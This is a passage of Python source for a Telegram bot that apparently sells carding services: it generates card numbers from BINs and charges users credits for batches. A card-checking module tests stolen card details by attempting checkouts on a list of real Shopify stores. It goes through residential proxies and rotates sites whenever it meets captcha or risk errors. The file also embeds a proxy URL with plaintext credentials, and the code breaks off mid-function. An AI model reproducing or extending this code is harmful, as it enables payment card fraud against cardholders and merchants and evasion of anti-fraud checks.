    card_type = bin_info.get("type", "N/A")
    
    # Format with UI elements
    return f"""<pre><a href='https://t.me/rev3rsex'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞</b> ✅</pre>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞</b> ↬ <code>{amount}</code> <b>cards</b>
<a href='https://t.me/rev3rsex'>⊀</a> <b>𝐁𝐢𝐧</b> ↬ <code>{bin_pattern[:6]}</code>

<pre>┌─ 𝐁𝐢𝐧: {brand}
├─ 𝐁𝐚𝐧𝐤: {bank}
├─ 𝐂𝐨𝐮𝐧𝐭𝐲: {country}
└─ 𝐓𝐨𝐩𝐞: {card_type}</pre>

<a href='https://t.me/rev3rsex'>⌬</a> <b>𝐃𝐞𝐯</b> ↬ <a href='https://t.me/+7x_7DZGSDCs1ZDBl'>@rev3rsex</a>"""

async def process_generation(user_id: int, bin_pattern: str, month: str, year: str, amount: int, cvv: str, update, context):
    """
    Process card generation in the background.
    
    Args:
        user_id: ID of the user requesting generation
        bin_pattern: BIN or prefix to use for card generation
        month: Expiry month ("rnd" for random or specific month)
        year: Expiry year ("rnd" for random or specific year)
        amount: Number of cards to generate
        cvv: CVV to use ("rnd" for random or specific CVV)
        update: Telegram update object
        context: Telegram context object
    """
    try:
        # Get user credits
        user_credits = get_user_credits(user_id)
        
        # Check if user has enough credits (or unlimited)
        is_unlimited = user_credits == float('inf')
        has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
        
        # If too many cards, send as a file with progress
        if amount > 10:
            # Send initial progress message
            progress_message = await update.message.reply_text(
                f"<pre><a href='https://t.me/+7x_7DZGSDCs1ZDBlr'>⩙</a> <b>𝑺𝒕𝒂𝒕𝒖𝒔</b> ↬ <b>𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐧𝐠</b> ⏳</pre>\n"
                f"<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> <b>𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐢𝐧𝐠</b> ↬ <code>{amount}</code> <b>cards</b>\n"
                f"<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⊀</a> <b>𝐁𝐢𝐧</b> ↬ <code>{bin_pattern[:6]}</code>\n"
                f"<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⚠️</a> <i>Generating {amount} cards... This may take a few seconds.</i>",
                parse_mode="HTML"
            )
            
            # Generate cards with BIN info
            cards, bin_info = await generate_cards_with_bin_info(bin_pattern, month, year, amount, cvv)
            
            # Create a file with just the cards (no BIN info inside)
            file_content = chr(10).join(cards)
            
            # Create a file-like object with the requested naming format
            file = io.BytesIO(file_content.encode('utf-8'))
            file.name = f"ChkX_{bin_pattern[:6]}.txt"
            
            # Format the caption with BIN information
            caption = format_bin_info_for_caption(bin_info, bin_pattern, amount)
            
            # Send the file
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=file,
                caption=caption,
                parse_mode="HTML"
            )
            
            # Delete the progress message
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=progress_message.message_id
                )
            except Exception as e:
                logger.error(f"Error deleting progress message: {str(e)}")
        else:
            # Generate cards with BIN info
            cards, bin_info = await generate_cards_with_bin_info(bin_pattern, month, year, amount, cvv)
            
            # Format the response
            formatted_response = format_cards_with_bin_info(cards, bin_info)
            
            # Send the cards directly in the message
            await update.message.reply_text(
                text=formatted_response,
                parse_mode="HTML"
            )
        
        # Deduct credits if successful generation and user doesn't have unlimited credits
        if not is_unlimited:
            # Calculate credits to deduct (1 credit per batch, not per card)
            update_user_credits(user_id, -1)
            
            # Get updated credits for response
            updated_credits = get_user_credits(user_id)
            
            # Add warning if credits are now 0
            if updated_credits is not None and updated_credits <= 0:
                # Send warning message
                await update.message.reply_text(
                    f"<a href='https://t.me/+7x_7DZGSDCs1ZDBl'>⚠️</a> <b>𝙒𝙖𝙧𝙣𝙚𝙧𝙖𝙩𝙚</b> <i>You have 0 credits left. Please recharge to continue using this service.</i>",
                    parse_mode="HTML"
                )
        
        logger.info(f"Generated {amount} cards for user {user_id} with BIN {bin_pattern[:6]}")
        
    except Exception as e:
        logger.error(f"Error generating cards for user {user_id}: {str(e)}")
        
        # Send a styled error message
        try:
            await update.message.reply_text(
                text=f"⚠️ <b>Error generating cards. Please try again.</b>",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Error sending error message: {str(e)}")

async def handle_gen_command(update, context):
    """
    Handle the /gen command for generating credit cards.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check cooldown for Trial users only (user-specific)
    current_time = datetime.now()
    if user_tier == "Trial" and user_id in last_command_time:
        time_diff = current_time - last_command_time[user_id]
        if time_diff < timedelta(seconds=10):
            remaining_seconds = 10 - int(time_diff.total_seconds())
            await update.message.reply_text(
                f"⏳ <b>Please wait {remaining_seconds} seconds before using this command again.</b>\n\n"
                f"<i>Upgrade your plan to remove the time limit.</i>",
                parse_mode="HTML"
            )
            return
    
    # Update last command time for this user
    last_command_time[user_id] = current_time
    
    # Get the input text after the command
    input_text = " ".join(context.args)
    
    if not input_text:
        await update.message.reply_text(
            "⚠️ <b>Invalid Format!</b>\n\n"
            "Please provide a valid BIN to generate cards.\n\n"
            "<b>Examples:</b>\n"
            "• <code>/gen 486732</code>\n"
            "• <code>/gen 486732|rnd|rnd|rnd</code> (for random dates and CVV)",
            parse_mode="HTML"
        )
        return
    
    # Parse the input
    try:
        bin_pattern, month, year, amount, cvv = parse_gen_input(input_text)
    except ValueError as e:
        await update.message.reply_text(
            f"⚠️ <b>Error: {str(e)}</b>\n\n"
            "Please provide a valid BIN (at least 6 digits).",
            parse_mode="HTML"
        )
        return
    
    # Start the generation process in the background
    asyncio.create_task(process_generation(user_id, bin_pattern, month, year, amount, cvv, update, context))



# ============================================================
# MODULE: status
# ============================================================
# Import database functions

# Import logger

# Configure logger for this module

# UI Elements
BULLET_LINK = "⌬"
BULLET_POINT = "⊀"
ARROW_RIGHT = "↬"
SECTION_DIVIDER = "――――――――――――――"

# Store bot start time for uptime calculation
BOT_START_TIME = time.time()

def get_uptime() -> str:
    """Get system uptime in days, hours, minutes, and seconds."""
    boot_time = psutil.boot_time()
    uptime_seconds = int(time.time() - boot_time)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

def get_bot_uptime() -> str:
    """Get bot uptime in days, hours, minutes, and seconds."""
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours:02}:{minutes:02}:{seconds:02}"

def create_progress_bar(percentage: float, length: int = 10) -> str:
    """Create a visual progress bar for resource usage."""
    filled_length = int(length * percentage / 100)
    bar = '█' * filled_length + '░' * (length - filled_length)
    return f"{bar} {percentage:.1f}%"

def get_system_info() -> dict:
    """Gather system information with error handling."""
    try:
        # CPU info
        cpu_usage = psutil.cpu_percent(interval=1)
        cpu_count = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        cpu_model = platform.processor() or "N/A"

        # RAM info
        memory = psutil.virtual_memory()
        total_memory = memory.total / (1024 ** 3)  # GB
        used_memory = memory.used / (1024 ** 3)
        available_memory = memory.available / (1024 ** 3)
        memory_percent = memory.percent

        # Swap info
        swap = psutil.swap_memory()
        total_swap = swap.total / (1024 ** 3)
        used_swap = swap.used / (1024 ** 3)
        swap_percent = swap.percent

        # Disk info
        disk = psutil.disk_usage("/")
        total_disk = disk.total / (1024 ** 3)  # GB
        used_disk = disk.used / (1024 ** 3)
        free_disk = disk.free / (1024 ** 3)
        disk_percent = disk.percent

        # Host/VPS info
        hostname = socket.gethostname()
        os_name = platform.system()
        os_version = platform.version()
        architecture = platform.machine()

        # Network info
        network = psutil.net_io_counters()
        bytes_sent = network.bytes_sent / (1024 ** 2)  # MB
        bytes_recv = network.bytes_recv / (1024 ** 2)  # MB
        network_interfaces = psutil.net_if_addrs()
        active_interfaces = [iface for iface in network_interfaces.keys() if not iface.startswith(('lo', 'docker', 'br-'))]

        # Uptime
        uptime_str = get_uptime()
        bot_uptime_str = get_bot_uptime()

        # Current time
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Bot restart time
        bot_restart_time = datetime.fromtimestamp(BOT_START_TIME).strftime("%Y-%m-%d %H:%M:%S")

        # Check if resources are critically low
        cpu_critical = cpu_usage > 90
        memory_critical = memory_percent > 90
        disk_critical = disk_percent > 90

        return {
            "cpu_usage": cpu_usage,
            "cpu_count": cpu_count,
            "cpu_freq": cpu_freq.current if cpu_freq else 0,
            "cpu_model": cpu_model,
            "total_memory": total_memory,
            "used_memory": used_memory,
            "available_memory": available_memory,
            "memory_percent": memory_percent,
            "total_swap": total_swap,
            "used_swap": used_swap,
            "swap_percent": swap_percent,
            "total_disk": total_disk,
            "used_disk": used_disk,
            "free_disk": free_disk,
            "disk_percent": disk_percent,
            "hostname": hostname,
            "os_name": os_name,
            "os_version": os_version,
            "architecture": architecture,
            "bytes_sent": bytes_sent,
            "bytes_recv": bytes_recv,
            "active_interfaces": active_interfaces,
            "uptime_str": uptime_str,
            "bot_uptime_str": bot_uptime_str,
            "current_time": current_time,
            "bot_restart_time": bot_restart_time,
            "cpu_critical": cpu_critical,
            "memory_critical": memory_critical,
            "disk_critical": disk_critical,
            "error": None
        }
    except Exception as e:
        logger.error(f"Error getting system info: {e}")
        return {
            "error": str(e),
            "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /status command to show bot and VPS status."""
    try:
        # Get system information
        sys_info = get_system_info()
        
        # Check for errors
        if sys_info.get("error"):
            error_message = (
                f"{BULLET_LINK} 𝐄𝐫𝐫𝐨𝐫 {ARROW_RIGHT} <code>❌ {sys_info['error']}</code>\n"
                f"{SECTION_DIVIDER}\n"
                f"{BULLET_LINK} 𝐓𝐢𝐦𝐞 {ARROW_RIGHT} <code>{sys_info['current_time']}</code>\n"
                f"{BULLET_LINK} 𝐁𝐨𝐭 𝐁𝐲 {ARROW_RIGHT} <a href='tg://resolve?domain=rev3rsex'>@rev3rsex</a>\n"
            )
            await update.message.reply_text(error_message, parse_mode=ParseMode.HTML)
            return
        
        # Get total users from database using the function from database.py
        total_users = get_total_users()
        
        # Check database connection
        db_status = "✅ Active"
        try:
            with connection_pool.getconn() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT 1")
                cursor.close()
        except Exception as e:
            logger.error(f"Database connection error: {e}")
            db_status = "❌ Error"
        
        # Format OS version to show only relevant part
        os_version_short = sys_info["os_version"].split("-")[0] if "-" in sys_info["os_version"] else sys_info["os_version"]
        
        # Create progress bars for visual representation
        cpu_bar = create_progress_bar(sys_info["cpu_usage"])
        memory_bar = create_progress_bar(sys_info["memory_percent"])
        disk_bar = create_progress_bar(sys_info["disk_percent"])
        
        # Create the status message with improved formatting
        status_message = (
            f"{BULLET_LINK} <b>𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬</b> {ARROW_RIGHT} <code>✅ Active</code>\n"
            f"{SECTION_DIVIDER}\n"
            
            f"{BULLET_LINK} <b>𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞</b> {ARROW_RIGHT} <code>{sys_info['bot_uptime_str']}</code>\n"
            f"{BULLET_LINK} <b>𝐒𝐲𝐬𝐭𝐞𝐦 𝐔𝐩𝐭𝐢𝐦𝐞</b> {ARROW_RIGHT} <code>{sys_info['uptime_str']}</code>\n"
            f"{BULLET_LINK} <b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭</b> {ARROW_RIGHT} <code>{sys_info['bot_restart_time']}</code>\n"
            f"{BULLET_LINK} <b>𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐓𝐢𝐦𝐞</b> {ARROW_RIGHT} <code>{sys_info['current_time']}</code>\n"
            f"{SECTION_DIVIDER}\n"
            
            f"{BULLET_LINK} <b>𝐒𝐲𝐬𝐭𝐞𝐦</b> {ARROW_RIGHT} <code>{sys_info['os_name']} {os_version_short}</code>\n"
            f"{BULLET_LINK} <b>𝐀𝐫𝐜𝐡𝐢𝐭𝐞𝐜𝐭𝐮𝐫𝐞</b> {ARROW_RIGHT} <code>{sys_info['architecture']}</code>\n"
            f"{SECTION_DIVIDER}\n"
            
            f"{BULLET_LINK} <b>𝐂𝐏𝐔</b> {ARROW_RIGHT} <code>{sys_info['cpu_usage']:.1f}% ({sys_info['cpu_count']} cores @ {sys_info['cpu_freq']:.0f}MHz)</code>\n"
            f"{BULLET_POINT} <b>Usage</b> {ARROW_RIGHT} <code>{cpu_bar}</code>\n"
            f"{SECTION_DIVIDER}\n"
            
            f"{BULLET_LINK} <b>𝐑𝐀𝐌</b> {ARROW_RIGHT} <code>{sys_info['used_memory']:.2f}GB / {sys_info['total_memory']:.2f}GB</code>\n"
            f"{BULLET_POINT} <b>Usage</b> {ARROW_RIGHT} <code>{memory_bar}</code>\n"
            f"{BULLET_POINT} <b>Available</b> {ARROW_RIGHT} <code>{sys_info['available_memory']:.2f}GB</code>\n"
            f"{SECTION_DIVIDER}\n"
            
            f"{BULLET_LINK} <b>𝐃𝐢𝐬𝐤</b> {ARROW_RIGHT} <code>{sys_info['used_disk']:.2f}GB / {sys_info['total_disk']:.2f}GB</code>\n"
            f"{BULLET_POINT} <b>Usage</b> {ARROW_RIGHT} <code>{disk_bar}</code>\n"
            f"{BULLET_POINT} <b>Free</b> {ARROW_RIGHT} <code>{sys_info['free_disk']:.2f}GB</code>\n"
            f"{SECTION_DIVIDER}\n"
            
            f"{BULLET_LINK} <b>𝐍𝐞𝐭𝐰𝐨𝐫𝐤</b> {ARROW_RIGHT} <code>↑ {sys_info['bytes_sent']:.1f}MB ↓ {sys_info['bytes_recv']:.1f}MB</code>\n"
            f"{BULLET_POINT} <b>Active Interfaces</b> {ARROW_RIGHT} <code>{', '.join(sys_info['active_interfaces'][:3])}</code>\n"
        )
        
        # Add warning if resources are critically low
        if sys_info["cpu_critical"] or sys_info["memory_critical"] or sys_info["disk_critical"]:
            warning_message = "\n⚠️ <b>Warning:</b> System resources are critically low!"
            status_message += warning_message
        
        # Add bot info at the end
        status_message += f"\n{SECTION_DIVIDER}\n{BULLET_LINK} <b>𝐁𝐨𝐭 𝐁𝐲</b> {ARROW_RIGHT} <a href='tg://resolve?domain=rev3rsex'>@rev3rsex</a>"
        
        # Create refresh button
        keyboard = [
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_status")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send the status message with refresh button
        await update.message.reply_text(
            status_message, 
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error in status command: {e}")
        await update.message.reply_text(
            f"⚠️ <b>Error:</b> <code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

async def refresh_status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the refresh button callback."""
    query = update.callback_query
    await query.answer("Refreshing status...")
    
    # Get system information
    sys_info = get_system_info()
    
    # Check for errors
    if sys_info.get("error"):
        error_message = (
            f"{BULLET_LINK} 𝐄𝐫𝐫𝐨𝐫 {ARROW_RIGHT} <code>❌ {sys_info['error']}</code>\n"
            f"{SECTION_DIVIDER}\n"
            f"{BULLET_LINK} 𝐓𝐢𝐦𝐞 {ARROW_RIGHT} <code>{sys_info['current_time']}</code>\n"
            f"{BULLET_LINK} 𝐁𝐨𝐭 𝐁𝐲 {ARROW_RIGHT} <a href='tg://resolve?domain=rev3rsex'>@rev3rsex</a>\n"
        )
        await query.edit_message_text(error_message, parse_mode=ParseMode.HTML)
        return
    
    # Get total users from database using the function from database.py
    total_users = get_total_users()
    
    # Check database connection
    db_status = "✅ Active"
    try:
        with connection_pool.getconn() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT 1")
            cursor.close()
    except Exception as e:
        logger.error(f"Database connection error: {e}")
        db_status = "❌ Error"
    
    # Format OS version to show only relevant part
    os_version_short = sys_info["os_version"].split("-")[0] if "-" in sys_info["os_version"] else sys_info["os_version"]
    
    # Create progress bars for visual representation
    cpu_bar = create_progress_bar(sys_info["cpu_usage"])
    memory_bar = create_progress_bar(sys_info["memory_percent"])
    disk_bar = create_progress_bar(sys_info["disk_percent"])
    
    # Create the status message with improved formatting
    status_message = (
        f"{BULLET_LINK} <b>𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐮𝐬</b> {ARROW_RIGHT} <code>✅ Active</code>\n"
        f"{BULLET_LINK} <b>𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞</b> {ARROW_RIGHT} <code>{db_status}</code>\n"
        f"{SECTION_DIVIDER}\n"
        
        f"{BULLET_LINK} <b>𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬</b> {ARROW_RIGHT} <code>{total_users}</code>\n"
        f"{BULLET_LINK} <b>𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞</b> {ARROW_RIGHT} <code>{sys_info['bot_uptime_str']}</code>\n"
        f"{BULLET_LINK} <b>𝐒𝐲𝐬𝐭𝐞𝐦 𝐔𝐩𝐭𝐢𝐦𝐞</b> {ARROW_RIGHT} <code>{sys_info['uptime_str']}</code>\n"
        f"{BULLET_LINK} <b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐭𝐚𝐫𝐭</b> {ARROW_RIGHT} <code>{sys_info['bot_restart_time']}</code>\n"
        f"{BULLET_LINK} <b>𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐓𝐢𝐦𝐞</b> {ARROW_RIGHT} <code>{sys_info['current_time']}</code>\n"
        f"{SECTION_DIVIDER}\n"
        
        f"{BULLET_LINK} <b>𝐒𝐲𝐬𝐭𝐞𝐦</b> {ARROW_RIGHT} <code>{sys_info['os_name']} {os_version_short}</code>\n"
        f"{BULLET_LINK} <b>𝐀𝐫𝐜𝐡𝐢𝐭𝐞𝐜𝐭𝐮𝐫𝐞</b> {ARROW_RIGHT} <code>{sys_info['architecture']}</code>\n"
        f"{BULLET_LINK} <b>𝐇𝐨𝐬𝐭𝐧𝐚𝐦𝐞</b> {ARROW_RIGHT} <code>{sys_info['hostname']}</code>\n"
        f"{SECTION_DIVIDER}\n"
        
        f"{BULLET_LINK} <b>𝐂𝐏𝐔</b> {ARROW_RIGHT} <code>{sys_info['cpu_usage']:.1f}% ({sys_info['cpu_count']} cores @ {sys_info['cpu_freq']:.0f}MHz)</code>\n"
        f"{BULLET_POINT} <b>Usage</b> {ARROW_RIGHT} <code>{cpu_bar}</code>\n"
        f"{SECTION_DIVIDER}\n"
        
        f"{BULLET_LINK} <b>𝐑𝐀𝐌</b> {ARROW_RIGHT} <code>{sys_info['used_memory']:.2f}GB / {sys_info['total_memory']:.2f}GB</code>\n"
        f"{BULLET_POINT} <b>Usage</b> {ARROW_RIGHT} <code>{memory_bar}</code>\n"
        f"{BULLET_POINT} <b>Available</b> {ARROW_RIGHT} <code>{sys_info['available_memory']:.2f}GB</code>\n"
        f"{SECTION_DIVIDER}\n"
        
        f"{BULLET_LINK} <b>𝐃𝐢𝐬𝐤</b> {ARROW_RIGHT} <code>{sys_info['used_disk']:.2f}GB / {sys_info['total_disk']:.2f}GB</code>\n"
        f"{BULLET_POINT} <b>Usage</b> {ARROW_RIGHT} <code>{disk_bar}</code>\n"
        f"{BULLET_POINT} <b>Free</b> {ARROW_RIGHT} <code>{sys_info['free_disk']:.2f}GB</code>\n"
        f"{SECTION_DIVIDER}\n"
        
        f"{BULLET_LINK} <b>𝐍𝐞𝐭𝐰𝐨𝐫𝐤</b> {ARROW_RIGHT} <code>↑ {sys_info['bytes_sent']:.1f}MB ↓ {sys_info['bytes_recv']:.1f}MB</code>\n"
        f"{BULLET_POINT} <b>Active Interfaces</b> {ARROW_RIGHT} <code>{', '.join(sys_info['active_interfaces'][:3])}</code>\n"
    )
    
    # Add warning if resources are critically low
    if sys_info["cpu_critical"] or sys_info["memory_critical"] or sys_info["disk_critical"]:
        warning_message = "\n⚠️ <b>Warning:</b> System resources are critically low!"
        status_message += warning_message
    
    # Add bot info at the end
    status_message += f"\n{SECTION_DIVIDER}\n{BULLET_LINK} <b>𝐁𝐨𝐭 𝐁𝐲</b> {ARROW_RIGHT} <a href='tg://resolve?domain=rev3rsex'>@rev3rsex</a>"
    
    # Create refresh button
    keyboard = [
        [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_status")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Edit the message with updated status
    await query.edit_message_text(
        status_message, 
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# Register the callback handler for the refresh button
def register_status_handlers(application):
    """Register status command handlers with the application."""
    application.add_handler(CallbackQueryHandler(refresh_status_callback, pattern="refresh_status"))



# ============================================================
# MODULE: sh
# ============================================================
# Configure logging

# List of proxies to use randomly
PROXIES = [
    "http://user-FG9IqFSVPYNRnxxV-type-residential-session-ydp0s2q8-country-US-city-New_York-rotation-15:RCMd2xUcgo5Swkxo@geo.g-w.info:10080",
]

# List of sites to try
SITE_URLS = [
    "https://naturallclub.com",
    "https://brittnetta.com",
    "https://brunekitchen.com",
    "https://brightland.co",
    "https://calliesbiscuits.com",
    "https://chazdean.com",
    "https://continentalconcord.com",
    "https://embeihold.rosecityworks.com",
    "https://fbffitness.myshopify.com",
    "https://getbeast.com"
]

# API endpoint
API_URL = SHOPIFY_API_URL

# Errors that should trigger a retry with a different site
RETRY_ERRORS = [
    'r4 token empty',
    'risky',
    'r2 id empty',
    'product not found',    
    'hcaptcha detected',
    'tax ammount empty',
    'del ammount empty',
    'product id is empty',
    'py id empty',
    'clinte token',
    'HCAPTCHA_DETECTED',
    'RECEIPT_EMPTY',
    'NA',
    'CAPTCHA_REQUIRED',
    'Site requires login!',
    'Failed to get token',
    'No Valid Products',
    'Not Shopify!',
    'Captcha at Checkout - Use good proxies!',
    'Payment method is not shopify!',
    'Site not supported for now!',
    'Connection error',
    'Connection Error!',
    'error',
    'AMOUNT_TOO_SMALL',
    'Change Proxy or Site',
    'receipt_empty',
    'amount_too_small',
    'HCAPTCHA_DETECTED',
    'Token Not Found',
    'INVALID_RESPONSE',
    'resolve',
    'item',  # Added 'item' to trigger site rotation
    'cURL error',  # Added cURL errors
    'Could not resolve host',  # Added host resolution errors
    'CONNECT tunnel failed',  # Added proxy tunnel errors
]

# Create a thread pool executor for background tasks
executor = ThreadPoolExecutor(max_workers=100)

# Dictionary to store last command time for each user (for cooldown)
last_command_time = {}

def sh_parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    """
    Parse card details from various formats.
    
    Args:
        card_string: String containing card details in various formats
        
    Returns:
        Tuple of (card_number, month, year, cvv) or None if parsing failed
    """
    # Remove any extra spaces
    card_string = card_string.strip()
    
    # Try different patterns
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410/08/30/545
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08:30:545
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410/08|30|545
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08/30/545
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4296190000711410:08|30|545
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4296190000711410|08:30:545
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        # Pattern: 4296190000711410 08 30 545
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        # Pattern: 4169161410569379/12|16|931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379/12|16/931
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379/12/16/931
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379|12/16|931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379|12/16/931
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12|16|931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        # Pattern: 4169161410569379:12|16/931
        r'^(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})$',
        # Pattern: 4169161410569379:12/16|931
        r'^(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return card_number, month, year, cvv
    
    return None

def sh_extract_card_from_text(text: str) -> Optional[str]:
    """
    Extract card details from a text message using various patterns.
    
    Args:
        text: The text to search for card details
        
    Returns:
        String containing card details in format "card|mm|yy|cvv" or None if not found
    """
    # Patterns to find card details in any text
    patterns = [
        # Pattern: 4296190000711410|08|30|545
        r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410/08/30/545
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08:30:545
        r'(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410/08|30|545
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08/30/545
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4296190000711410:08|30|545
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4296190000711410|08:30:545
        r'(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})',
        # Pattern: 4296190000711410 08 30 545
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        # Pattern: 4169161410569379/12|16|931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379/12|16/931
        r'(\d{13,19})\/(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379/12/16/931
        r'(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379|12/16/931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379|12/16/931
        r'(\d{13,19})\|(\d{1,2})\/(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12|16|931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
        # Pattern: 4169161410569379:12|16/931
        r'(\d{13,19}):(\d{1,2})\|(\d{2,4})\/(\d{3,4})',
        # Pattern: 4169161410569379:12/16/931
        r'(\d{13,19}):(\d{1,2})\/(\d{2,4})\|(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            card_number, month, year, cvv = match.groups()
            
            # Normalize month (ensure it's 2 digits)
            month = month.zfill(2)
            
            # Normalize year (if it's 4 digits, take last 2)
            if len(year) == 4:
                year = year[2:]
            
            return f"{card_number}|{month}|{year}|{cvv}"
    
    return None

def sh_get_random_proxy() -> str:
    """Get a random proxy from list."""
    return random.choice(PROXIES)

async def sh_check_card(card_details: str, user_info: Dict) -> Optional[str]:
    """
    Check card details using Shopify API asynchronously with aiohttp.
    Will try multiple sites if one returns an error from RETRY_ERRORS.
    
    Args:
        card_details: String containing card details in various formats
        user_info: Dictionary containing user information
        
    Returns:
        Formatted response string or None if there was an error
    """
    # Parse card details
    parsed = sh_parse_card_details(card_details)
    if not parsed:
        return "⚠️ <b>Missing card details!</b>\n\n<i>Usage: /sh card|mm|yy|cvv</i>"
    
    card_number, month, year, cvv = parsed
    
    # Get BIN information using the imported function
    bin_number = card_number[:6]
    bin_details = await get_bin_info(bin_number)
    brand = (bin_details.get("scheme") or "N/A").title()
    issuer = bin_details.get("bank") or "N/A"
    country_name = bin_details.get("country") or "Unknown"
    country_flag = bin_details.get("country_emoji", "")
    
    user_id = user_info.get("id")
    
    user_sites = get_user_sites(user_id) if user_id else []
    if user_sites:
        sites_to_try = user_sites.copy()
    else:
        sites_to_try = SITE_URLS.copy()
    random.shuffle(sites_to_try)
    
    # Try each site until we get a valid response or run out of sites
    for site_url in sites_to_try:
        # Get a random proxy
        proxy = sh_get_random_proxy()
        
        # Prepare API request parameters
        params = {
            "cc": f"{card_number}|{month}|{year}|{cvv}",
            "url": site_url,
            "proxy": "",
